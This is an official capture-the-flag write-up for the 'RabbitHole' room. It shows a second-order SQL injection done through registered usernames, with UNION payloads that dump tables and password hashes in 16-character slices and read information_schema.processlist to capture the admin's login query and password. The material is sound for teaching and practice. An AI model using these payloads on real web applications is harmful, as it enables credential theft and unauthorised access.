---
title: RabbitHole room official writeup
draft: false
tags:
  - sqli
date: 2024-10-25
---
# The main idea

Main room idea is centered around a second order sql injection. By placing SQL payloads into username, we can dump the database. We have some restrictions in place, because extracted data is truncated to 16 chars.

Password hashes are only a rabbit-hole, we need to find a way to dump running queries by doing a 

```sql
SELECT info from information_schema.processlist
```

to intercept the admin user and password. In some way this is a kind of SQL-inception: here the inception "theme" refers to the ability for an SQL query to select itself, by interrogating processlist in mysql for instance . Actually in this room it's better not to select ourselves in order to get more readable output, but this only because of the intentionally annoying construction.

Here you can find some research in the area: https://rstforums.com/forum/topic/92884-sql-inception-how-to-select-yourself/, https://web.archive.org/web/20161006031303/http://www.contextis.com/resources/blog/sql-inception-how-select-yourself/

Credit for the original idea goes to Adam Langley who developed the challenges for the H1 HackyHolidays 2021 event. The last challenge was about this technique: I just made it even more evil than the original :)

# Recon

A scan with nmap reveals port 22 and a web server on port 80. We are invited to register for a recruitment campaign.

![[293416992-8c6f0ce4-2c5b-4954-a402-3f737e6d7d02.png]]

We are told that there are anti bruteforce measures in place implemented with database queries (this will be key for exploiting the service). Playing around with the web service we can see that login takes 5 seconds, and we cannot tell a difference if we use correct or incorrect credentials.

# Inside the rabbit hole

So we register a user `test` and we login. We immediately notice our login time and also that user admin seems to login every 60 seconds. Probably this is the effect of active monitoring.

![[293417403-b1860bbc-3021-412d-a7ef-1efef7dde3bb.png]]

There is  not much to do or discover here, until we register a user with a `"` character and we get this SQL error:

```
SQLSTATE[42000]: Syntax error or access violation: 1064 
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB
server version for the right syntax to use near '""" ORDER BY login_time DESC LIMIT 0,5' at line 1
```

# Second order SQL injection

Here we have a common second order SQL injection: we can insert a SQL payload as username, and output will be shown on the last logins page. We start poking around with the following usernames:

- `0" union all select null,database()-- -` revealing database `web`
- `0" UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'web'-- -`: this reveals tables `logins` and `users`
- `0" UNION SELECT null,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'  and table_schema='web'-- -`: here we start to see a problem: query output is truncated to 16 characters as shown below.

![[293418288-175cbeac-0595-4354-8c3e-547bc4dcdc3e.png]]
![[293418318-c86d7777-3df6-40ac-a783-298e48326537.png]]
![[293418304-9774e39e-f464-4188-8622-b6c2c1d85c80.png]]

We can easily check for output length limits if for instance we do this:

```
0" union all select username,pass from users
```

We will get an error about a wrong column name, meaning that **"pass" is not the complete column name**

At this point we can obviously guess column names (username and password) and, since we know that output is limited to 16 chars per row,  a complete useful query can be this:

```
0" union all (select null,mid(concat(username,password),1,16) from users limit 0,1) union all (select null,mid(concat(username,password),17,32) from users limit 0,1) union all (select null,mid(concat(username,password),33,48) from users limit 0,1)-- -
```

that will give these results:

```html
<tr><td>admin***********</td></tr>
<tr><td>****************</td></tr>
<tr><td>*****</td></tr>
```

With the same technique we get a bunch of usernames and hashes:

```
admin ********************************
foo   a51e47f646375ab6bf5dd2c42d3e6181
bar   de97e75e5b4604526a2afaed5f5439d7
```

Cracking hashes explains the room name:

![[293418891-404cb615-368d-492e-9203-c23a4b7bfc82.png]]
# information_schema.processlist

So admin hash is not crackable. But remembering that logins take 5 seconds, we start wondering if something is visible from information_schema.processlist (all running queries are visible from this table). We register a user named:

```
0" union all select null,info from information_schema.processlist-- -
```

and after a minute we start seeing something:

```html
<thead><th>User 21 - 0" union all select null,info from information_schema.processlist-- - last logins</th></thead><tbody>
<tr><td>SELECT * FROM lo</td></tr>
<tr><td>SELECT * from us</td></tr>
```

So the page we are looking at is constructed with a query like `SELECT * from logins...` but there is also another query running every minute, related to admin login, and is probably something like `SELECT * from users...`. So we try to isolate that query by *not* selecting ourselves:

```
0" union all select null,info from information_schema.processlist where info not like '%info%'-- -
```

In the end this payload will reveal the admin login query:

```sql
0" union all select null,mid(info,1,16) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,17,32) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,33,48) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,49,64) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,65,80) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,81,96) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,97,112) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,113,128) from information_schema.processlist where info not like '%info%'
union all select null,mid(info,129,144) from information_schema.processlist where info not like '%info%'-- -
```

```html
<tbody>
<tr><td>SELECT * from us</td></tr>
<tr><td>ers where (usern</td></tr>
<tr><td>ame= 'admin' and</td></tr>
<tr><td> password=md5('*</td></tr>
<tr><td>****************</td></tr>
<tr><td>****************</td></tr>
<tr><td>****************</td></tr>
<tr><td>***************'</td></tr>
<tr><td>) ) UNION ALL SE</td></tr>
</tbody></table>
```

We can now ssh as user admin and get the flag